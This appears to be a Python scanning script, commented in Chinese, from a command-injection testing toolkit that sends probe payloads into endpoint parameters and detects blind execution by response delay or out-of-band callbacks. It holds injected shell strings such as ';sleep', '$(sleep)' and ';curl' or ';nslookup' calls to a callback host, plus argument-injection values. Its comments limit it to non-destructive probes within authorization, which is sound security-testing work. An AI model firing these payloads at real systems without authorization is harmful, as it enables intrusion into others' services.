# -*- coding: utf-8 -*-
"""hunt-command-injection hunt 阶段：对入口注入无害探测 payload，按时序/带外判活。

安全默认：只发 sleep 时序 + 带外回连 + 参数注入探测，不投放破坏/持久化 payload。
时序判活：注 sleep <D>，若响应稳定慢约 D 秒（vs 基线）→ 疑似盲命令执行。
带外判活：注 nslookup/curl <OAST>，命中需你在 OAST 侧核对。

用法:
  python hunt_cmdi.py --input recon/endpoints.json --output candidates.json --oast <域名>
      [--delay 8] [--repeat 2] [--dry-run]
"""
import argparse
import os
import sys
import time
import statistics
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json, http_probe  # noqa: E402


def payloads(oast, delay):
    d = str(delay)
    return [
        ("time-semicolon", ";sleep %s;" % d, "slow"),
        ("time-pipe", "|sleep %s" % d, "slow"),
        ("time-subshell", "$(sleep %s)" % d, "slow"),
        ("time-backtick", "`sleep %s`" % d, "slow"),
        ("time-ping", "|ping -c %s 127.0.0.1" % d, "slow"),
        ("oast-nslookup", ";nslookup %s;" % oast, "oast"),
        ("oast-curl", ";curl http://%s/hit;" % oast, "oast"),
        ("arg-output", "--output=/tmp/hunt_cmdi_marker", "arginj"),
        ("arg-dasho", "-o/tmp/hunt_cmdi_marker", "arginj"),
    ]


def build_url(ep, value):
    base, param = ep.get("url"), ep.get("param")
    if not param or param.startswith("<"):
        return None  # 上传/无参数入口需人工构造，跳过自动注入
    sep = "&" if "?" in base else "?"
    return "%s%s%s=%s" % (base, sep, param, quote(value, safe=""))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--input", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--oast", required=True)
    ap.add_argument("--delay", type=int, default=8)
    ap.add_argument("--repeat", type=int, default=2)
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--max-time", type=int, default=20)
    args = ap.parse_args()

    data = load_json(args.input)
    if not data:
        sys.exit("读不到 %s，先跑 recon.sh" % args.input)
    eps = [e for e in data.get("endpoints", []) if e.get("controllable")]
    cands = []
    for ep in eps:
        if not ep.get("param") or ep["param"].startswith("<"):
            cands.append({"endpoint": ep.get("url"), "param": ep.get("param"),
                          "family": "manual", "signal": ["上传/无参入口，需人工构造 delegate payload"],
                          "suspected": False})
            continue
        # 基线时延
        base_url = build_url(ep, "hunt_baseline")
        base_med = None
        if not args.dry_run and base_url:
            ts = [http_probe(base_url, max_time=args.max_time)["time"] for _ in range(args.repeat)]
            try:
                base_med = statistics.median(float(t) for t in ts)
            except ValueError:
                base_med = None
        for name, pl, kind in payloads(args.oast, args.delay):
            url = build_url(ep, pl)
            if args.dry_run:
                print("[dry-run] %s | %s | %s" % (ep.get("param"), name, url)); continue
            times = []
            last = None
            for _ in range(args.repeat):
                r = http_probe(url, max_time=args.max_time)
                times.append(float(r["time"]) if r["time"] else 0.0)
                last = r
            med = statistics.median(times) if times else 0.0
            signal, suspected = [], False
            if kind == "slow" and base_med is not None and med >= base_med + args.delay - 2:
                signal.append("时序命中(基线%.2fs→%.2fs, 注入sleep%ds)" % (base_med, med, args.delay))
                suspected = True
            if kind == "oast":
                signal.append("需在 OAST 侧核对回连")
            if kind == "arginj":
                signal.append("参数注入探测，检查目标是否生成 /tmp/hunt_cmdi_marker（授权内）")
            cands.append({"endpoint": ep.get("url"), "param": ep.get("param"),
                          "family": name, "payload": pl, "probe_url": url,
                          "median_time": round(med, 3), "signal": signal or ["无明显信号"],
                          "suspected": suspected})
    if args.dry_run:
        return
    save_json(args.output, {"target": data.get("target"), "oast": args.oast, "candidates": cands})
    hit = sum(1 for c in cands if c.get("suspected"))
    log("生成候选 %d（%d 时序疑似）-> %s（带外命中查 OAST 日志，validate 复核）"
        % (len(cands), hit, args.output))


if __name__ == "__main__":
    main()
